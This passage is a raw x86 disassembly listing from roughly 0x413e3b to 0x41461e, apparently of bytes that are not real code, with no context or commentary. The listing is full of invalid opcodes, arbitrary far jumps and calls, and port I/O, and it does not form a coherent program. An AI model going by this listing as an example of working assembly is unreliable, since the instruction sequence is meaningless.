  413e3b:	and    edi,DWORD PTR [ecx+0x46bab254]
  413e41:	add    BYTE PTR [edx+ebx*8+0x61],bl
  413e45:	inc    edi
  413e46:	and    eax,0x92fbf991
  413e4b:	inc    edx
  413e4c:	adc    eax,0xa44c6bef
  413e51:	xor    eax,DWORD PTR ds:0x4ae9b48
  413e57:	cld    
  413e58:	nop
  413e59:	scas   eax,DWORD PTR es:[edi]
  413e5a:	fadd   QWORD PTR [ebp+0x7d]
  413e5d:	call   0xcc8e:0xe67e8b07
  413e64:	and    ecx,DWORD PTR [edx]
  413e66:	or     dh,BYTE PTR [eax+0x7]
  413e69:	push   edi
  413e6a:	int    0xe5
  413e6c:	inc    eax
  413e6d:	adc    DWORD PTR [eax+0x24],esi
  413e70:	in     eax,0x0
  413e72:	dec    edi
  413e73:	xchg   esi,eax
  413e74:	out    dx,al
  413e75:	lods   al,BYTE PTR ds:[esi]
  413e76:	xchg   edx,eax
  413e77:	mul    BYTE PTR [esi+0x45552b4b]
  413e7d:	xchg   esp,eax
  413e7e:	mov    ah,0xc5
  413e80:	popf   
  413e81:	pop    ebp
  413e82:	nop
  413e83:	dec    ebx
  413e84:	test   al,0x33
  413e86:	retf   0xf7c3
  413e89:	(bad)  
  413e8a:	lock clc 
  413e8c:	mov    BYTE PTR ds:0xc53737d1,bl
  413e92:	jae    0x413f13
  413e94:	push   ebx
  413e95:	cmp    dh,BYTE PTR [esi]
  413e97:	or     DWORD PTR [eax],0x4e
  413e9a:	aas    
  413e9b:	xchg   ecx,eax
  413e9c:	add    DWORD PTR [ecx+0x1e],0x2e
  413ea0:	leave  
  413ea1:	mov    ds:0x90255d98,eax
  413ea6:	add    al,0xc2
  413ea8:	popf   
  413ea9:	inc    ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	ss inc ecx
  413ead:	(bad)  
  413eae:	mov    eax,0x830e247a
  413eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413eb4:	xor    eax,DWORD PTR [edi-0x5]
  413eb7:	xor    eax,ebx
  413eb9:	inc    esi
  413eba:	gs pop edi
  413ebc:	loopne 0x413e6b
  413ebe:	pop    es
  413ebf:	add    eax,0x595f6034
  413ec4:	inc    esp
  413ec5:	sti    
  413ec6:	aaa    
  413ec7:	mov    ds:0x2956ae94,eax
  413ecc:	loope  0x413efa
  413ece:	mov    ch,0x94
  413ed0:	cwde   
  413ed1:	mov    ebx,0xafff4065
  413ed6:	aad    0xdd
  413ed8:	mov    ecx,0x9e03dd2
  413edd:	fwait
  413ede:	call   0x6933c417
  413ee3:	mov    ebp,es
  413ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ee6:	mov    ds:0x214c71af,eax
  413eeb:	jle    0x413ed2
  413eed:	lea    ecx,[edi]
  413eef:	adc    edi,edx
  413ef1:	add    edi,DWORD PTR [edi-0x505560b]
  413ef7:	mov    bh,0xa6
  413ef9:	bound  edi,QWORD PTR [ecx+eax*1+0x6600fc40]
  413f00:	xchg   DWORD PTR [edi-0x72],esi
  413f03:	jmp    0xae05:0x94ca64e0
  413f0a:	repz aam 0x2
  413f0d:	sub    BYTE PTR [ebx+esi*1+0x6f],dl
  413f11:	fstp   QWORD PTR [ebp+0x70a8e519]
  413f17:	push   0x4d
  413f19:	mov    cl,al
  413f1b:	cmp    eax,0x25196912
  413f20:	test   esi,esp
  413f22:	mov    eax,0x452dadaf
  413f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f28:	and    edx,edx
  413f2a:	mov    ds:0x66f651a5,eax
  413f2f:	and    eax,0xc5087898
  413f34:	fucomp st(5)
  413f36:	mov    WORD PTR [ecx-0x2a6d0442],fs
  413f3c:	jle    0x413f2f
  413f3e:	and    esp,DWORD PTR [esp+edx*8]
  413f41:	cs in  al,0xa9
  413f44:	in     eax,0x22
  413f46:	aas    
  413f47:	cmp    ch,bl
  413f49:	dec    esi
  413f4a:	sbb    BYTE PTR [esi-0x4968e4eb],bl
  413f50:	and    ah,BYTE PTR [edx]
  413f52:	push   ebp
  413f53:	aad    0x8e
  413f55:	xchg   edx,eax
  413f56:	aad    0x3b
  413f58:	lods   al,BYTE PTR ds:[esi]
  413f59:	xchg   esp,eax
  413f5a:	test   al,0x84
  413f5c:	dec    ebx
  413f5d:	xchg   edx,eax
  413f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5f:	mov    ah,BYTE PTR [eax+0x2e1857ce]
  413f65:	call   0x7f268d2f
  413f6a:	pop    ds
  413f6b:	dec    ebx
  413f6c:	or     BYTE PTR [ebp+0x30],dh
  413f6f:	addr16 sub eax,0x58a9477e
  413f75:	jno    0x413fd2
  413f77:	out    dx,al
  413f78:	sar    dl,cl
  413f7a:	xchg   ebp,eax
  413f7b:	jae    0x413f63
  413f7d:	addr16 push ss
  413f7f:	sbb    ch,BYTE PTR [edx+ebp*2+0x44d75d7a]
  413f86:	cmp    BYTE PTR [edi+0x7],al
  413f89:	popa   
  413f8a:	jnp    0x413f13
  413f8c:	andps  xmm2,xmm0
  413f8f:	pop    esi
  413f90:	pop    ds
  413f91:	inc    edi
  413f92:	imul   ebp,DWORD PTR [esi+0x5a],0xfffffff4
  413f96:	pop    ds
  413f97:	nop
  413f98:	cli    
  413f99:	loope  0x413f3b
  413f9b:	int    0xf9
  413f9d:	add    ah,BYTE PTR [ecx]
  413f9f:	imul   eax,DWORD PTR [eax],0xcbeef4a8
  413fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa6:	mov    edi,0xb3fe5d8d
  413fab:	jmp    0x3ea8:0x9778b383
  413fb2:	retf   0x9388
  413fb5:	xchg   BYTE PTR [edi-0x175e2a70],dh
  413fbb:	mov    esi,0x79a40694
  413fc0:	push   0x19
  413fc2:	mov    BYTE PTR [edx-0x4e22a257],ch
  413fc8:	stos   BYTE PTR es:[edi],al
  413fc9:	call   0x1280:0x10c9e2c9
  413fd0:	mov    eax,0x7c5bf569
  413fd5:	add    DWORD PTR [esi+edx*4],ecx
  413fd8:	shl    BYTE PTR [ecx-0x18],cl
  413fdb:	dec    eax
  413fdc:	hlt    
  413fdd:	jne    0x413fff
  413fdf:	adc    ch,BYTE PTR [esi+ecx*2-0x5fef2599]
  413fe6:	ds cld 
  413fe8:	call   0x34de:0x603bacb6
  413fef:	lds    esp,FWORD PTR ds:[edx]
  413ff2:	or     BYTE PTR gs:0xc6b2374f,cl
  413ff9:	jb     0x413f9a
  413ffb:	xchg   ecx,eax
  413ffc:	mov    al,ds:0x30f92039
  414001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414002:	mov    bl,0x9e
  414004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414005:	sbb    BYTE PTR [esi],0x22
  414008:	push   ds
  414009:	out    dx,al
  41400a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41400b:	nop
  41400c:	xor    esi,ebp
  41400e:	in     eax,dx
  41400f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414010:	cmp    eax,0xd2148d3a
  414015:	dec    ebx
  414016:	fdivr  DWORD PTR [ecx+edi*4]
  414019:	cmp    DWORD PTR [esi+0x4d],edx
  41401c:	dec    edx
  41401d:	lods   al,BYTE PTR ds:[esi]
  41401e:	aaa    
  41401f:	jno    0x413fef
  414021:	repnz sub bh,BYTE PTR [ecx]
  414024:	and    al,bl
  414026:	xchg   esi,eax
  414027:	out    dx,eax
  414028:	fist   DWORD PTR [ebx+0x25]
  41402b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41402c:	out    dx,eax
  41402d:	xor    DWORD PTR [ebx+ebp*2+0x34],0x8b5edeb5
  414035:	and    ecx,DWORD PTR [ecx]
  414037:	scas   eax,DWORD PTR es:[edi]
  414038:	add    eax,0xe8be1500
  41403d:	xor    edx,DWORD PTR [eax+0x3a]
  414040:	(bad)
  414043:	mov    edx,0x27481c1a
  414048:	or     al,0xca
  41404a:	into   
  41404b:	or     cl,ah
  41404d:	les    esi,FWORD PTR [edi-0x5848f5be]
  414053:	jecxz  0x4140c9
  414055:	in     eax,0x15
  414057:	add    al,0x65
  414059:	or     edi,esi
  41405b:	add    al,BYTE PTR [eax]
  41405d:	jle    0x4140b0
  41405f:	adc    cl,0x7a
  414062:	and    DWORD PTR [edi-0x16],edx
  414065:	rol    BYTE PTR [eax],0xd
  414068:	lds    edx,FWORD PTR [ecx+0x25]
  41406b:	lds    edx,FWORD PTR [edi+0x21]
  41406e:	pop    edi
  41406f:	jmp    0x39595f01
  414074:	xor    DWORD PTR [edx],edx
  414076:	rcr    BYTE PTR [esp+eax*1],cl
  414079:	(bad)  
  41407a:	and    ebp,DWORD PTR [eax+0x5128771a]
  414080:	mov    DWORD PTR [ebp-0x390aedea],esi
  414086:	int    0xd
  414088:	retf   
  414089:	retf   0xba4c
  41408c:	xor    edx,DWORD PTR [edx+eax*4-0x55]
  414090:	test   esi,edi
  414092:	cld    
  414093:	ja     0x4140c6
  414095:	push   0xa098b686
  41409a:	inc    ebp
  41409b:	ins    BYTE PTR es:[edi],dx
  41409c:	jo     0x41407a
  41409e:	push   ecx
  41409f:	stos   DWORD PTR es:[edi],eax
  4140a0:	push   ebp
  4140a1:	jg     0x4140a1
  4140a3:	lods   eax,DWORD PTR ds:[esi]
  4140a4:	out    dx,al
  4140a5:	fldcw  WORD PTR [eax-0x20]
  4140a8:	(bad)  
  4140a9:	retf   0x4f80
  4140ac:	int3   
  4140ad:	adc    ecx,ebx
  4140af:	sbb    esi,DWORD PTR [ecx-0x21]
  4140b2:	mov    WORD PTR [edi],es
  4140b4:	mov    esi,0x80506f0d
  4140b9:	mov    esi,0x41459954
  4140be:	loop   0x414135
  4140c0:	mov    al,ds:0x3996f2b1
  4140c5:	add    bh,BYTE PTR [edi+0x1db2a047]
  4140cb:	sub    al,0x90
  4140cd:	jp     0x4140cf
  4140cf:	jb     0x41409f
  4140d1:	jno    0x414056
  4140d3:	pop    edi
  4140d4:	arpl   WORD PTR [eax-0x3f],cx
  4140d7:	out    dx,eax
  4140d8:	leave  
  4140d9:	dec    edx
  4140da:	pop    ebp
  4140db:	adc    bl,ah
  4140dd:	mov    al,ds:0x5ce4b8fc
  4140e2:	jno    0x41408c
  4140e4:	repz xor cl,0xc5
  4140e8:	mov    bl,0xdd
  4140ea:	push   0x5a
  4140ec:	test   al,0x3a
  4140ee:	inc    eax
  4140ef:	and    edx,ebx
  4140f1:	push   edx
  4140f2:	xchg   edx,eax
  4140f3:	hlt    
  4140f4:	push   0xf1e3b6d7
  4140f9:	dec    ecx
  4140fa:	dec    edx
  4140fb:	xchg   edx,eax
  4140fc:	popa   
  4140fd:	loop   0x414179
  4140ff:	in     al,dx
  414100:	outs   dx,DWORD PTR ds:[esi]
  414101:	iret   
  414102:	xor    al,0x48
  414104:	mov    ebx,0x33b85323
  414109:	mov    al,0x37
  41410b:	mov    edi,0x3e69f4c0
  414110:	sub    al,0xe8
  414112:	adc    eax,0xd3c27f0
  414117:	push   ecx
  414118:	xor    al,0x5d
  41411a:	pushf  
  41411b:	enter  0x36df,0xe6
  41411f:	std    
  414120:	push   ebx
  414121:	mov    ch,0xf8
  414123:	jle    0x4140df
  414125:	(bad)  
  414126:	in     al,0xa7
  414128:	lds    ecx,FWORD PTR [edi]
  41412a:	aam    0xe4
  41412c:	xor    BYTE PTR [ebp-0xc],ah
  41412f:	aaa    
  414130:	sub    DWORD PTR [ecx+0x45347ccf],eax
  414136:	pop    ebx
  414137:	mov    fs,eax
  414139:	push   esi
  41413a:	jp     0x414157
  41413c:	pop    esi
  41413d:	mov    DWORD PTR [ebp+0x6ec960d2],ecx
  414143:	xchg   ebx,eax
  414144:	inc    ecx
  414145:	in     al,dx
  414146:	mov    al,0xf0
  414148:	dec    ecx
  414149:	pop    esp
  41414a:	ins    DWORD PTR es:[edi],dx
  41414b:	mov    ecx,0xd733dcdc
  414150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414151:	data16 jp 0x4141ca
  414154:	or     BYTE PTR [edx-0x13660f20],dh
  41415a:	dec    esi
  41415b:	cmp    al,0x9a
  41415d:	add    ebx,esi
  41415f:	pop    ebp
  414160:	fild   WORD PTR ds:0x1ef92c37
  414166:	pop    es
  414167:	(bad)  
  414168:	jno    0x4141c3
  41416a:	sub    edx,DWORD PTR [edi-0x10d5c939]
  414170:	xchg   ebp,eax
  414171:	xor    al,0xb7
  414173:	(bad)  
  414174:	ret    0x985e
  414177:	icebp  
  414178:	ror    BYTE PTR [edi+0x56],0x4a
  41417c:	ins    DWORD PTR es:[edi],dx
  41417d:	shl    DWORD PTR cs:[ebx+0x4625769e],cl
  414184:	call   0xc76417fa
  414189:	jo     0x414160
  41418b:	cmp    al,cl
  41418d:	cmp    edi,eax
  41418f:	push   0x516c4d65
  414194:	pop    ebp
  414195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414196:	retf   0x8e43
  414199:	xchg   DWORD PTR [ebp-0x24],edi
  41419c:	sahf   
  41419d:	aas    
  41419e:	neg    DWORD PTR [eax]
  4141a0:	xchg   ebx,eax
  4141a1:	cmp    cl,dl
  4141a3:	mov    dh,0x7
  4141a5:	retf   
  4141a6:	xor    al,0x92
  4141a8:	or     bh,dh
  4141aa:	xchg   ebp,eax
  4141ab:	paddd  mm5,mm0
  4141ae:	pushf  
  4141af:	push   esp
  4141b0:	loopne 0x414164
  4141b2:	lock fs mov ecx,0x90daa62b
  4141b9:	inc    esi
  4141ba:	jnp    0x4141a5
  4141bc:	enter  0x8a06,0x19
  4141c0:	int3   
  4141c1:	pmaxub mm3,QWORD PTR [ecx]
  4141c4:	mov    ds:0x2083bae0,al
  4141c9:	sar    DWORD PTR ds:0x7b192751,1
  4141cf:	pop    edi
  4141d0:	and    BYTE PTR fs:[edx],bl
  4141d3:	mov    bh,BYTE PTR [eax-0x50]
  4141d6:	nop
  4141d7:	out    dx,eax
  4141d8:	popf   
  4141d9:	cmp    bl,BYTE PTR [edx+edi*4+0x64]
  4141dd:	sbb    al,0xa8
  4141df:	aaa    
  4141e0:	loop   0x414194
  4141e2:	(bad)  
  4141e4:	mov    esp,0xb362b73e
  4141e9:	xchg   edi,eax
  4141ea:	neg    DWORD PTR [edx+0x304bd67e]
  4141f0:	repz mov esi,0x72257c7b
  4141f6:	ds mov bh,0xf0
  4141f9:	shl    DWORD PTR [ebx-0x1e03e487],cl
  4141ff:	jbe    0x414201
  414201:	jmp    0x93c6:0xf89e4701
  414208:	pop    ss
  414209:	lahf   
  41420a:	stos   BYTE PTR es:[edi],al
  41420b:	mov    DWORD PTR [esi+ebx*2],edi
  41420e:	pop    edx
  41420f:	in     eax,dx
  414210:	js     0x41426f
  414212:	dec    ecx
  414213:	mov    fs,WORD PTR [ebx]
  414215:	std    
  414216:	popa   
  414217:	mov    ds:0x6e1306ec,eax
  41421c:	cmp    BYTE PTR [eax+eax*4],0xb4
  414220:	mov    ds:0xd74458e8,al
  414225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414226:	jge    0x414241
  414228:	push   edi
  414229:	xlat   BYTE PTR ds:[ebx]
  41422a:	js     0x41429f
  41422c:	jmp    0x55366b5b
  414231:	jmp    0xb8a3:0xc69dc2df
  414238:	jmp    0x4141ee
  41423a:	adc    esi,esi
  41423c:	mov    esi,0xf386bbba
  414241:	stc    
  414242:	sub    DWORD PTR [edx+0x49617d92],ebp
  414248:	sub    dl,BYTE PTR [esi]
  41424a:	inc    ebp
  41424b:	add    eax,0x918ea2ff
  414250:	add    BYTE PTR [eax],ah
  414252:	inc    ecx
  414253:	pop    ds
  414254:	daa    
  414255:	jbe    0x4141e1
  414257:	pop    edx
  414258:	sub    DWORD PTR [esi],edi
  41425a:	adc    BYTE PTR [ebx-0x3dc50292],bh
  414260:	loop   0x414299
  414262:	outs   dx,DWORD PTR ds:[esi]
  414263:	jmp    0x2d41c3be
  414268:	jmp    0x8c31:0x135ed45c
  41426f:	pop    ebp
  414270:	mov    ds:0x5fcc1eb4,al
  414275:	cmp    BYTE PTR [ebx+0x13],ah
  414278:	sti    
  414279:	and    DWORD PTR [esi+0x6c124dba],edi
  41427f:	dec    ebp
  414280:	add    al,0x7e
  414282:	popa   
  414283:	or     al,0x1
  414285:	retf   0x8059
  414288:	out    0x9c,al
  41428a:	sub    DWORD PTR [ebx+0x20],edi
  41428d:	dec    ebp
  41428e:	mov    ebp,DWORD PTR [ebp-0x4b885260]
  414294:	push   ebp
  414295:	adc    DWORD PTR [edx+0x4d3133a],esp
  41429b:	jg     0x4142a8
  41429d:	lock lods eax,DWORD PTR ds:[esi]
  41429f:	mov    bl,0xdd
  4142a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a2:	mov    eax,0x5604e71d
  4142a7:	push   esp
  4142a8:	jb     0x41428d
  4142aa:	mov    ds:0x23c81408,eax
  4142af:	or     ecx,DWORD PTR [esi]
  4142b1:	test   DWORD PTR [ebx-0x3f8a7b2e],ebx
  4142b7:	loopne 0x414276
  4142b9:	and    DWORD PTR [ebx+0x51a2257c],ebp
  4142bf:	pop    es
  4142c0:	rcl    DWORD PTR [edx],cl
  4142c2:	push   ss
  4142c3:	or     DWORD PTR [ecx+esi*4],0xcbf850d
  4142ca:	fwait
  4142cb:	mov    cl,0xe5
  4142cd:	mov    ah,0x8d
  4142cf:	test   eax,0x2f454768
  4142d4:	sbb    esi,edi
  4142d6:	rcl    dl,cl
  4142d8:	cmp    al,0xdd
  4142da:	into   
  4142db:	ss inc edx
  4142dd:	xchg   DWORD PTR gs:[eax],ebp
  4142e0:	test   BYTE PTR [esi+0x464bc27c],0xc5
  4142e7:	pop    ss
  4142e8:	add    al,0xa
  4142ea:	add    BYTE PTR [esi+0x35],0x4a
  4142ee:	daa    
  4142ef:	call   0x556453aa
  4142f4:	jg     0x41429b
  4142f6:	cmp    edi,DWORD PTR [ebx]
  4142f8:	(bad)  
  4142f9:	push   esp
  4142fa:	(bad)  
  4142fc:	test   eax,0x6eb0159a
  414301:	cmp    eax,0xff7dba00
  414306:	inc    eax
  414307:	cmp    bh,BYTE PTR [ebp+edx*2+0x3ca6d2bf]
  41430e:	ds push esi
  414310:	ss cld 
  414312:	mov    edx,0x2425cdbe
  414317:	mov    edi,DWORD PTR [ecx+eiz*2+0x20]
  41431b:	aas    
  41431c:	jmp    0x6b75cc9e
  414321:	imul   ebp,DWORD PTR [eax],0x57b5518b
  414327:	push   eax
  414328:	or     al,0xc6
  41432a:	add    al,0xb6
  41432c:	sbb    DWORD PTR [esi+eax*8+0x78],ebp
  414330:	fscale 
  414332:	xchg   edx,eax
  414333:	jmp    0x41433d
  414335:	mov    bl,0x38
  414337:	xor    al,0x85
  414339:	adc    DWORD PTR [edi],0x726658a3
  41433f:	xor    ebx,edi
  414341:	jb     0x41436b
  414343:	xor    al,BYTE PTR ds:0xc46fc7ec
  414349:	inc    esp
  41434a:	cs mov edi,0x699bb675
  414350:	sbb    esi,ebp
  414352:	scas   al,BYTE PTR es:[edi]
  414353:	ins    DWORD PTR es:[edi],dx
  414354:	(bad)  
  414355:	ret    
  414356:	adc    al,0xb2
  414358:	push   esi
  414359:	push   cs
  41435a:	dec    ecx
  41435b:	rcr    eax,cl
  41435d:	gs mov dh,0xc4
  414360:	jmp    0x7c0ceb28
  414365:	add    DWORD PTR [eax+0xa],eax
  414368:	lahf   
  414369:	xchg   DWORD PTR [ecx-0x72892fb9],esp
  41436f:	aam    0x45
  414371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414372:	ja     0x225f2214
  414378:	nop
  414379:	js     0x414338
  41437b:	add    BYTE PTR [ecx],cl
  41437d:	data16 lods al,BYTE PTR ds:[esi]
  41437f:	imul   edx,edx,0xabf522e9
  414385:	mov    eax,ds:0x760afe20
  41438a:	add    BYTE PTR [esi],0xb5
  41438d:	jp     0x41436b
  41438f:	in     al,0x70
  414391:	(bad)  
  414392:	scas   eax,DWORD PTR es:[edi]
  414393:	cld    
  414394:	retf   0xe605
  414397:	jmp    0xf2b55ec8
  41439c:	pop    esi
  41439d:	sub    ah,cl
  41439f:	(bad)  
  4143a0:	popf   
  4143a1:	shr    BYTE PTR [ebx-0x4c],0x5d
  4143a5:	inc    ebp
  4143a6:	inc    eax
  4143a7:	mov    eax,0x502908ea
  4143ac:	mov    ?,WORD PTR [ecx+0x14446ffb]
  4143b2:	fs ret 
  4143b4:	jle    0x41438e
  4143b6:	pop    ebx
  4143b7:	xchg   BYTE PTR [ebx+0x76],bl
  4143ba:	add    DWORD PTR [esi+0x3a],0x5b
  4143be:	out    dx,eax
  4143bf:	add    DWORD PTR [ebp+0x4f9bf7a3],ecx
  4143c5:	mul    DWORD PTR [ecx]
  4143c7:	sbb    BYTE PTR [eax+0x4],al
  4143ca:	cmp    ch,al
  4143cc:	jbe    0x414430
  4143ce:	cmp    eax,0xb9695a80
  4143d3:	mov    ecx,0x49310c7f
  4143d8:	xchg   BYTE PTR [esi-0x1d964279],cl
  4143de:	ficomp WORD PTR [edi]
  4143e0:	and    DWORD PTR [eax-0x1081f64d],esp
  4143e6:	jmp    0xe27740b0
  4143eb:	mov    bh,0xd6
  4143ed:	je     0x4143fe
  4143ef:	xchg   edx,eax
  4143f0:	stos   DWORD PTR es:[edi],eax
  4143f1:	cmp    ah,BYTE PTR [ebx+ebp*8]
  4143f4:	ins    BYTE PTR es:[edi],dx
  4143f5:	mov    al,0xe7
  4143f7:	inc    eax
  4143f8:	jle    0x414384
  4143fa:	add    ah,BYTE PTR [esp+edi*1]
  4143fd:	cmp    BYTE PTR [ecx],al
  4143ff:	popf   
  414400:	pop    DWORD PTR [edx]
  414402:	jno    0x4143d1
  414404:	popf   
  414405:	adc    eax,0xd0e430bb
  41440a:	dec    ecx
  41440b:	adc    bl,BYTE PTR [ebx+0x6b]
  41440e:	cmp    dl,BYTE PTR [ebx-0x49b638aa]
  414414:	pop    edi
  414415:	stos   DWORD PTR es:[edi],eax
  414416:	lods   al,BYTE PTR ds:[esi]
  414417:	stc    
  414418:	pop    ss
  414419:	es iret 
  41441b:	jmp    0x92d1:0x96679b3
  414422:	mov    dl,0xb0
  414424:	fld    QWORD PTR [edi-0x674b359b]
  41442a:	xchg   edx,eax
  41442b:	clc    
  41442c:	cdq    
  41442d:	int    0x82
  41442f:	out    0xab,eax
  414431:	push   ss
  414432:	std    
  414433:	pop    edx
  414434:	adc    BYTE PTR [ebx+0x3c],ch
  414437:	jg     0x4143f8
  414439:	les    esp,FWORD PTR [ebx+0x4593da30]
  41443f:	dec    edx
  414440:	(bad)  
  414441:	icebp  
  414442:	xchg   ebp,eax
  414443:	push   cs
  414444:	std    
  414445:	repnz sub dh,bh
  414448:	popf   
  414449:	sar    DWORD PTR [ebx-0x12],1
  41444c:	in     eax,dx
  41444d:	in     al,0x7f
  41444f:	jmp    0xa566:0x4b9f33d8
  414456:	sub    DWORD PTR [ebx-0x1a],ebp
  414459:	push   esi
  41445a:	cdq    
  41445b:	add    eax,0x55739d8a
  414460:	and    al,0xdc
  414462:	sbb    eax,0xe60bf241
  414467:	dec    esi
  414468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414469:	jbe    0x4144c0
  41446b:	pop    esi
  41446c:	mov    WORD PTR [ecx-0x13f0bd01],ds
  414472:	das    
  414473:	neg    ah
  414475:	test   al,0x5c
  414477:	pushf  
  414478:	stos   DWORD PTR es:[edi],eax
  414479:	fadd   st,st(0)
  41447b:	addr16 push cs
  41447d:	push   eax
  41447e:	imul   ecx,DWORD PTR [ebp+esi*4+0x28],0x75
  414483:	sbb    al,0x33
  414485:	push   ecx
  414486:	scas   al,BYTE PTR es:[edi]
  414487:	jle    0x4144c1
  414489:	and    ebp,ebx
  41448b:	add    al,0x8c
  41448d:	mov    dh,0x6c
  41448f:	cld    
  414490:	pop    ecx
  414491:	outs   dx,DWORD PTR ds:[esi]
  414492:	add    eax,DWORD PTR [ecx-0x1f]
  414495:	ss cmc 
  414497:	dec    eax
  414498:	sub    esp,DWORD PTR [ebx-0x73cf8887]
  41449e:	jecxz  0x414463
  4144a0:	cmp    al,0x2e
  4144a2:	or     DWORD PTR [esi],ebx
  4144a4:	ins    BYTE PTR es:[edi],dx
  4144a5:	and    al,0x78
  4144a7:	sbb    DWORD PTR [esi],ebp
  4144a9:	push   ebx
  4144aa:	das    
  4144ab:	aam    0xee
  4144ad:	jno    0x4144c7
  4144af:	adc    eax,0xd108e275
  4144b4:	sub    al,dh
  4144b6:	ror    BYTE PTR [edi+0x5b],cl
  4144b9:	int3   
  4144ba:	out    dx,eax
  4144bb:	inc    ebp
  4144bc:	pop    esp
  4144bd:	sbb    DWORD PTR [esp+ecx*1+0x6ffcc3f3],0xffffffb7
  4144c5:	inc    edi
  4144c6:	loopne 0x414499
  4144c8:	(bad)  
  4144c9:	idiv   DWORD PTR [ebx]
  4144cb:	daa    
  4144cc:	jmp    0x58a1:0x55349cf4
  4144d3:	int3   
  4144d4:	cwde   
  4144d5:	imul   edi,DWORD PTR [ecx+0x44712435],0xcd8edc4
  4144df:	aam    0x5
  4144e1:	xchg   edx,edx
  4144e3:	sub    dh,0x55
  4144e6:	sub    eax,0x8561397
  4144eb:	imul   ebp,DWORD PTR [ebp+0x4a694bac],0x55
  4144f2:	loop   0x414554
  4144f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f5:	add    ebp,DWORD PTR [edi+0x40934e75]
  4144fb:	je     0x4144d6
  4144fd:	push   ds
  4144fe:	inc    eax
  4144ff:	and    DWORD PTR [edi],0x3511d194
  414505:	pop    ss
  414506:	lods   eax,DWORD PTR ds:[esi]
  414507:	scas   al,BYTE PTR es:[edi]
  414508:	setae  BYTE PTR [esi-0x50]
  41450c:	xor    edi,eax
  41450e:	(bad)  
  41450f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414510:	lea    edi,[edx]
  414512:	inc    edi
  414513:	lds    ecx,FWORD PTR ss:[edx]
  414516:	pop    edx
  414517:	and    ebp,esp
  414519:	or     ecx,DWORD PTR [eax]
  41451b:	cmp    al,0x33
  41451d:	push   cs
  41451e:	in     al,dx
  41451f:	mov    bl,0x80
  414521:	cmp    al,0x78
  414523:	mov    edx,DWORD PTR [edi]
  414525:	adc    BYTE PTR [ebp-0x7c6d0e22],0x19
  41452c:	jae    0x414565
  41452e:	nop
  41452f:	ds in  al,dx
  414531:	sbb    eax,DWORD PTR [ebp-0x1]
  414534:	sub    al,0xdb
  414536:	sub    ebx,esi
  414538:	jg     0x4144f8
  41453a:	inc    sp
  41453c:	mov    dl,0xac
  41453e:	(bad)  
  41453f:	mov    dh,0x77
  414541:	test   eax,0xf7089ade
  414546:	or     BYTE PTR [ecx-0x4097a3fe],dh
  41454c:	outs   dx,BYTE PTR ds:[esi]
  41454d:	sbb    DWORD PTR [eax+0x19ed986e],0x94f9bee4
  414557:	cs sahf 
  414559:	ret    
  41455a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41455b:	xchg   BYTE PTR [ebp+0x2a843e40],bl
  414561:	call   0xa4255aca
  414566:	std    
  414567:	adc    cl,BYTE PTR [esi-0x3b]
  41456a:	popf   
  41456b:	jno    0x4145bf
  41456d:	mov    cl,0xf4
  41456f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414570:	popf   
  414571:	mov    ecx,0xc4adb6c1
  414576:	iret   
  414577:	mov    al,ds:0x219d56b7
  41457c:	jmp    0xb17f:0x342ee66b
  414583:	ret    0x3712
  414586:	dec    ebp
  414587:	ret    
  414588:	iret   
  414589:	sahf   
  41458a:	xchg   esp,eax
  41458b:	hlt    
  41458c:	int    0x24
  41458e:	pop    ebx
  41458f:	mov    ebx,0x481c7942
  414594:	lea    ecx,[edx+eax*1]
  414597:	test   BYTE PTR [ecx+0x49a1abe8],dl
  41459d:	mov    ds:0x664ece0d,eax
  4145a2:	mov    ch,bh
  4145a4:	ins    BYTE PTR es:[edi],dx
  4145a5:	pop    es
  4145a6:	xor    eax,0xcbe5c593
  4145ab:	int    0x1
  4145ad:	adc    dl,BYTE PTR [esi+0x32bfe2e]
  4145b3:	out    dx,eax
  4145b4:	fdivr  QWORD PTR [ebp+edi*2-0x6e]
  4145b8:	pop    ds
  4145b9:	mov    ebp,edi
  4145bb:	xchg   ecx,eax
  4145bc:	mov    dh,0xd8
  4145be:	rcr    BYTE PTR [eax*4-0x2fa1b425],0x3d
  4145c6:	aas    
  4145c7:	jecxz  0x414551
  4145c9:	arpl   WORD PTR [eax],si
  4145cb:	mov    ah,0xba
  4145cd:	push   0x4e064e58
  4145d2:	sbb    DWORD PTR [edx+0x2fe32c5e],0x30610fd1
  4145dc:	loopne 0x41465b
  4145de:	mov    bl,0x3d
  4145e0:	mov    dl,0x1d
  4145e2:	xchg   edi,eax
  4145e3:	adc    eax,0x69270ccf
  4145e8:	cs inc edi
  4145ea:	stc    
  4145eb:	adc    BYTE PTR [esp+ebx*2-0x51],ch
  4145ef:	inc    edx
  4145f0:	fwait
  4145f1:	lods   al,BYTE PTR ds:[esi]
  4145f2:	jno    0x414581
  4145f4:	jecxz  0x414662
  4145f6:	sti    
  4145f7:	cdq    
  4145f8:	xor    eax,0x58a0cf78
  4145fd:	mov    edx,0xd44a7001
  414602:	ja     0x414653
  414604:	fnstsw WORD PTR [ebp+0x5b7e82d0]
  41460a:	add    eax,0xc1e62c18
  41460f:	mov    esi,0xdd23efef
  414614:	dec    esp
  414615:	imul   esi,edx,0x16
  414618:	cmp    DWORD PTR [esi+0x7c197a6],eax
  41461e:	inc    edi
